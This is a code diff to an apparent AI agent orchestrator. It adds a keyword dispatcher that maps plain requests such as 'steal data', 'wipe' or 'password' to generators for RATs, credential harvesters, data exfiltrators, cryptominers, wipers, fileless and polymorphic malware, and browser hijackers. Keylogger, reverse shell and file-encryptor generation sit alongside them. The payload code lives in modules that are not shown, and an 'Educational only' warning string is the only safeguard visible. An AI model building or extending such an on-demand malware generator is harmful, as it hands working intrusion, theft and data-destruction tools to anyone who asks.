@@ -5,6 +5,7 @@ from typing import Optional, Dict
 from agents.orchestrator_pi import PiOrchestrator
 from cybersecurity.enhanced_ddos import EnhancedDDoSTester
 from cybersecurity.enhanced_malware import EnhancedMalwareLab
+from cybersecurity.malware_expansion import ExpandedMalwareLab
 from cybersecurity.usb_integration import USBIntegration
 from cybersecurity.improvements import ImprovedNLP, EnhancedAuthorization, VSOCReporter
 from prompts.specialists import SECURITY_PRIVACY_PROMPT
@@ -17,6 +18,7 @@ class EnhancedCybersecurityOrchestrator:
     def __init__(self, base_orchestrator: Optional[PiOrchestrator] = None):
         self.base_orchestrator = base_orchestrator
         self.malware_lab = EnhancedMalwareLab(isolated_mode=True)
+        self.expanded_malware_lab = ExpandedMalwareLab(isolated_mode=True)
         self.ddos_tester = EnhancedDDoSTester(max_threads=50)
         self.usb_integration = USBIntegration()
         self.nlp = ImprovedNLP()
@@ -58,17 +60,86 @@ class EnhancedCybersecurityOrchestrator:
         """Handle malware creation with options"""
         request_lower = request.lower()
         
-        # Determine payload type
+        # Check for expanded malware types first
+        expanded_types = {
+            "rat": "rat",
+            "remote access": "rat",
+            "trojan": "rat",
+            "credential": "credential_harvester",
+            "harvester": "credential_harvester",
+            "password": "credential_harvester",
+            "exfiltrate": "data_exfiltrator",
+            "exfiltration": "data_exfiltrator",
+            "steal data": "data_exfiltrator",
+            "miner": "cryptominer",
+            "crypto": "cryptominer",
+            "mine": "cryptominer",
+            "wipe": "wiper",
+            "wiper": "wiper",
+            "destroy": "wiper",
+            "fileless": "fileless",
+            "memory": "fileless",
+            "polymorphic": "polymorphic",
+            "self modifying": "polymorphic",
+            "hijack": "browser_hijacker",
+            "browser": "browser_hijacker"
+        }
+        
         payload_type = None
-        if "keylogger" in request_lower:
-            payload_type = "keylogger"
-        elif "reverse" in request_lower or "shell" in request_lower:
-            payload_type = "reverse_shell"
-        elif "encrypt" in request_lower or "ransom" in request_lower:
-            payload_type = "file_encryptor"
+        use_expanded = False
+        
+        for keyword, ptype in expanded_types.items():
+            if keyword in request_lower:
+                payload_type = ptype
+                use_expanded = True
+                break
+        
+        # Fall back to basic types
+        if not payload_type:
+            if "keylogger" in request_lower:
+                payload_type = "keylogger"
+            elif "reverse" in request_lower or "shell" in request_lower:
+                payload_type = "reverse_shell"
+            elif "encrypt" in request_lower or "ransom" in request_lower:
+                payload_type = "file_encryptor"
+            elif "scanner" in request_lower or "network scan" in request_lower:
+                payload_type = "network_scanner"
         
         if not payload_type:
-            return "Specify payload type: keylogger, reverse_shell, or file_encryptor"
+            # List available payloads
+            basic = ["keylogger", "reverse_shell", "file_encryptor", "network_scanner"]
+            advanced = ["rat", "credential_harvester", "data_exfiltrator", "cryptominer", 
+                       "wiper", "fileless", "polymorphic", "browser_hijacker"]
+            return f"Specify payload type. Basic: {', '.join(basic)}. Advanced: {', '.join(advanced)}"
+        
+        # Use expanded lab for advanced payloads
+        if use_expanded:
+            try:
+                if payload_type == "rat":
+                    payload = self.expanded_malware_lab.create_rat()
+                elif payload_type == "credential_harvester":
+                    payload = self.expanded_malware_lab.create_credential_harvester()
+                elif payload_type == "data_exfiltrator":
+                    payload = self.expanded_malware_lab.create_data_exfiltrator()
+                elif payload_type == "cryptominer":
+                    payload = self.expanded_malware_lab.create_cryptominer()
+                elif payload_type == "wiper":
+                    payload = self.expanded_malware_lab.create_wiper()
+                elif payload_type == "fileless":
+                    payload = self.expanded_malware_lab.create_fileless_malware()
+                elif payload_type == "polymorphic":
+                    # Need base payload for polymorphic
+                    base = self.malware_lab.create_obfuscated_payload("keylogger", "none")
+                    payload = self.expanded_malware_lab.create_polymorphic_engine(base.get("file", ""))
+                elif payload_type == "browser_hijacker":
+                    payload = self.expanded_malware_lab.create_browser_hijacker()
+                else:
+                    payload = None
+                
+                if payload:
+                    return f"Created {payload_type}: {payload['file']}. {payload.get('warning', 'Educational only.')}"
+            except Exception as e:
+                return f"Error creating {payload_type}: {str(e)}"
         
         # Check for obfuscation
         obfuscation = None
@@ -78,9 +149,6 @@ class EnhancedCybersecurityOrchestrator:
         if obfuscation:
             payload = self.malware_lab.create_obfuscated_payload(payload_type, obfuscation)
             return f"Created obfuscated {payload_type} with {obfuscation}: {payload['file']}. {payload['warning']}"
-        elif "polymorphic" in request_lower:
-            payload = self.malware_lab.create_polymorphic_payload(payload_type)
-            return f"Created polymorphic {payload_type}: {payload['file']}. {payload['warning']}"
         else:
             # Use enhanced malware lab
             payload = self.malware_lab.create_obfuscated_payload(payload_type, "none")
